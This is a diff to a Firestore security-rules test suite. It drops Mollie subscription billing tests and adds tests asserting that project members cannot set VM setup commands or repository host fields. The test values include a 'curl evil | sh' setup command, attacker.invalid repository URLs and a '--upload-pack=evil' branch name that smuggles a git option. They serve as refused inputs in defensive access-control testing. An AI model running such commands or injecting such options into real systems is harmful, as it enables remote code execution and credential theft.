@@ -10,7 +10,6 @@ const {
     arrayUnion,
     collection,
     deleteDoc,
-    deleteField,
     doc,
     getDoc,
     getDocs,
@@ -585,7 +584,6 @@ describe('gold, premium and the Stripe link are server-owned', () => {
         dailyGold: 100000,
         premium: { status: 'premium' },
         stripeCustomerId: 'cus_somebody_else',
-        customerId: 'cst_somebody_else',
     }
 
     beforeEach(async () => {
@@ -596,7 +594,6 @@ describe('gold, premium and the Stripe link are server-owned', () => {
                 dailyGold: 100,
                 premium: { status: 'free' },
                 stripeCustomerId: '',
-                customerId: '',
             })
             await setDoc(doc(db, `users/${MEMBER_ID}/goldTransactions/charge-1`), {
                 direction: 'spend',
@@ -642,8 +639,6 @@ describe('gold, premium and the Stripe link are server-owned', () => {
         await assertFails(bootstrap('rich-user', { ...defaults, gold: 1000 }))
         await assertFails(bootstrap('premium-user', { ...defaults, premium: { status: 'premium' } }))
         await assertFails(bootstrap('linked-user', { ...defaults, stripeCustomerId: 'cus_somebody_else' }))
-        await assertFails(bootstrap('mollie-user', { ...defaults, customerId: 'cst_somebody_else' }))
-        await assertSucceeds(bootstrap('empty-mollie-user', { ...defaults, customerId: '' }))
     })
 
     it('lets the owner read the gold ledger but not write it or its claims', async () => {
@@ -664,56 +659,49 @@ describe('gold, premium and the Stripe link are server-owned', () => {
     })
 })
 
-describe('the Mollie subscription billing fields are server-owned (security audit 2026-11)', () => {
-    // The subscription callables act on subscriptions/{auth.uid} and trust these fields; a client
-    // that could copy another payer's Mollie ids into its own document could re-price or cancel
-    // that payer's subscription through them.
-    const subscriptionPath = `subscriptions/${MEMBER_ID}`
-
-    beforeEach(async () => {
-        await testEnv.withSecurityRulesDisabled(async context => {
-            await setDoc(doc(context.firestore(), subscriptionPath), {
-                customerId: 'cst_member',
-                subscriptionIdInMollie: 'sub_member',
-                status: 'active',
-                activePaidUsersIds: [MEMBER_ID],
-                paidUsersIds: [MEMBER_ID],
-                selectedUserIds: [MEMBER_ID],
-                companyData: { name: 'Member GmbH' },
-                showSuccessfullyPayment: true,
-            })
-        })
-    })
-
-    it('lets the owner edit company data and the seat selection, clear the banner and delete', async () => {
-        const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
-        const subscription = doc(memberDb, subscriptionPath)
-
-        await assertSucceeds(getDoc(subscription))
-        await assertSucceeds(updateDoc(subscription, { companyData: { name: 'Renamed GmbH' } }))
-        await assertSucceeds(updateDoc(subscription, { selectedUserIds: [MEMBER_ID, OUTSIDER_ID] }))
-        await assertSucceeds(updateDoc(subscription, { showSuccessfullyPayment: deleteField() }))
-        await assertSucceeds(deleteDoc(subscription))
-    })
-
+describe('VM coding inputs on the project document are server-owned (security audit 2026-11)', () => {
+    // Another member's credentialed VM coding job boots from the golden snapshot and pairs the
+    // repository connection with that member's token, so a member must not be able to set them.
     it.each([
-        ['customerId', 'cst_victim'],
-        ['subscriptionIdInMollie', 'sub_victim'],
-        ['status', 'canceled'],
-        ['activePaidUsersIds', [MEMBER_ID, OUTSIDER_ID]],
-        ['paidUsersIds', [MEMBER_ID, OUTSIDER_ID]],
-    ])('refuses an owner write of %s', async (field, value) => {
+        ['vmGolden', { setupCommand: 'curl evil | sh', snapshotId: 'team/elsewhere:1', status: 'ready' }],
+        ['vmGolden.setupCommand', 'curl evil | sh'],
+        ['githubRepoUrl', 'https://attacker.invalid/acme/app'],
+        ['githubApiBase', 'https://attacker.invalid/api/v3'],
+        ['githubHost', 'https://attacker.invalid'],
+        ['githubBaseBranch', '--upload-pack=evil'],
+        ['gitlabRepoUrl', 'https://attacker.invalid/group/app'],
+        ['gitlabHost', 'https://attacker.invalid'],
+        ['gitlabBaseBranch', 'evil'],
+    ])('refuses a member write of %s', async (field, value) => {
         const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
 
-        await assertFails(updateDoc(doc(memberDb, subscriptionPath), { [field]: value }))
+        await assertFails(updateDoc(doc(memberDb, `projects/${PROJECT_ID}`), { [field]: value }))
     })
 
-    it('refuses a client-created subscription and any access by somebody else', async () => {
-        const outsiderDb = testEnv.authenticatedContext(OUTSIDER_ID).firestore()
+    it('leaves ordinary member edits of the project alone', async () => {
+        const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
 
-        await assertFails(setDoc(doc(outsiderDb, `subscriptions/${OUTSIDER_ID}`), { customerId: 'cst_victim' }))
-        await assertFails(getDoc(doc(outsiderDb, subscriptionPath)))
-        await assertFails(updateDoc(doc(outsiderDb, subscriptionPath), { companyData: { name: 'x' } }))
+        await assertSucceeds(updateDoc(doc(memberDb, `projects/${PROJECT_ID}`), { name: 'Renamed' }))
+        await assertSucceeds(setDoc(doc(memberDb, `projects/${PROJECT_ID}`), { lastActionDate: 7 }, { merge: true }))
+    })
+
+    it('still lets a creator start a project with empty repository fields', async () => {
+        const creatorDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
+
+        await assertSucceeds(
+            setDoc(doc(creatorDb, 'projects/new-project-with-repo-fields'), {
+                creatorId: MEMBER_ID,
+                isShared: 2,
+                userIds: [MEMBER_ID],
+                githubRepoUrl: '',
+                githubBaseBranch: '',
+                githubHost: '',
+                githubApiBase: '',
+                gitlabRepoUrl: '',
+                gitlabBaseBranch: '',
+                gitlabHost: '',
+            })
+        )
     })
 })
 
@@ -1576,6 +1564,7 @@ describe('server-only data', () => {
         `firestoreAccessProjectionJobs/${PROJECT_ID}`,
         'firestoreAccessProjectionMigrations/schema-v2',
         'verifiedEmailIdentities/abc123/accounts/member',
+        `vmGoldens/${PROJECT_ID}`,
     ])('denies client reads and writes at %s', async documentPath => {
         const memberDb = testEnv.authenticatedContext(MEMBER_ID).firestore()
 
